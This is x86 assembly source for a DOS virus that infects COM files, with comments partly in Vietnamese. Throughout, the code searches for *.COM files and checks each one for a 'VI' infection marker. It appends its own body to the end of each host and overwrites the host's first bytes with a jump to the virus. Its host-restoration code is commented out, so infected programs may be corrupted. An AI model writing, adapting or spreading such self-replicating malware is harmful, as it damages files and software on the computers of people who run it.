.model small
.code 
   
    ORG 100H  
    
START:  
  jmp near ptr START_VIRUS    
  db 'VI' 
  db      100H dup (90H)  ;force above jump to be near with 256 nop's
  mov     ax,4C00H
  int     21H    
  
VIRUS:       ;virus label        

DATA_ARRAY DB 0,0,0,0,0    

START_VIRUS:
    call EXECUTE
    
EXECUTE:    
    pop di   
    sub di,offset EXECUTE
    call FIND_FILE 
           
FIND_FILE:
;    push bp
;    sub sp,43H
;    mov bp,sp
;    mov dx,bp
;    mov ah,1AH
;    int 21H           ; push doan DTA search len stack
    
    mov ah,4EH
    lea dx,[di+OFFSET COM_FILE]
    int 21H     
FIND_LOOP:
    jc DONE
    mov ax,3D02H 
    mov dx,9EH
    int 21H 
    mov bx,ax            ; put file handle vao bx    
    
CHECK_FILE:              ; check 5 byte ban dau.
    mov ah,3FH
    mov cx,5
    lea dx,[di+DATA_ARRAY]
    int 21h 
   
    cmp word ptr [di+DATA_ARRAY],0E9H
    je  short CLOSE_FILE
    cmp word ptr [di+DATA_ARRAY+3],'IV'
    je  short CLOSE_FILE                    ; file da infected, move to next file.
    mov si,word ptr [di+DATA_ARRAY]                  ; else store at si 
    push si                                 ; push si to stack
    
    xor cx,cx
    xor dx,dx            ; cx:dx=0
    mov ax,4202H         ; ah=42H,   al= {0:beginning;2:end of file;1:present location}
    int 21H              ; move to end of file
    
    mov cx, OFFSET ENDVIR - OFFSET VIRUS    ; so luong byte can write
    lea dx,[di+VIRUS]                       ; bat dau tu label virus
    mov ah,40H
    int 21H    
    jc  short CLOSE_FILE 
    
    xor cx,cx
    xor dx,dx
    mov ax,4200H
    int 21H              ; move back ve dau host, dat lenh jmp
    
;    mov byte ptr [di+DATA_ARRAY],0E9H            ; set 1 byte dau tien la lenh jmp(co opcode 0E9H)  
;    mov ax,[bp+1AH]                              ; orginal file size
;    add ax,offset START_VIRUS - offset VIRUS -3  ; plus data_array,relative jmp always ref to the ip (point at 103H) when jmp execute.
;    mov word ptr [di+DATA_ARRAY+1],ax            ; jmp toi dau
;    mov word ptr [di+DATA_ARRAY+3],4956H         ; 2 byte sau la virus marker
;   
;    mov cx,5
;    mov ah,40H
;    lea dx,[di+DATA_ARRAY]
;    int 21H  
    
    mov cx,5                      ; set 5 bytes ghi vo host
    lea dx,[di+OFFSET TEST_JMP]      ; tai vi tri data_array
    mov ah,40H
    int 21H                       ; ghi
    
CLOSE_FILE:    
    mov ah,3EH      
    int 21H         ;close file
    mov ah,4FH      
    int 21H         ;search for next file
    jmp FIND_LOOP  
         
DONE:
;    mov ah,1AH                      ; restore DTA
;    mov dx,80H
;    int 21H                              
;    mov si,offset START             ; restore 
;    push si
;    movsw
;    movsw
;    movsb     
    ret                             ; tra lai access cho host
        
    
COM_FILE    DB      '*.COM',0
TEST_JMP: 
     jmp near ptr START_VIRUS    
     db 'VI' 
        
ENDVIR:  

END START
